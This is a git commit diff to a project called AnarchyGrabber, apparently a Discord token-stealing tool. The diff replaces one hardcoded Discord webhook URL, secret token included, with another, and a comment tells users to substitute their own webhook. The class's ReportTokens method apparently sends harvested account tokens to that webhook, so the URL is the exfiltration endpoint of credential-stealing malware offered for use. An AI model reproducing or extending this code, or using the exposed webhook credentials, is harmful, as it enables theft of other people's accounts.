2e348604592392f891d09529e2bb57790d8fa205
iLinked1337 <ilinkedthememe@gmail.com>
2019-11-29 07:46:35 +0100

    e

--- AnarchyGrabber/Webhook.cs
+++ AnarchyGrabber/Webhook.cs
@@ -7,7 +7,7 @@ namespace AnarchyGrabber
     public static class Webhook
     {
         //you've got to change this to your own discord webhook url
-        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/645293662615371821/R22LjURtjPqQXP0slcz5KzuaRpTs7Rblma0O59Qp1dtKz5vlVKz7vOzvW1CXphmA9y39";
+        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/649861953325367297/LlFuipVbRcCY57GfrG9Jcw6G1VsyMR8L0hVvp7aqYClmON2_Mdie7fdhGtw3iUws6ilS";
 
 
         public static void ReportTokens(List<string> tokenReport)
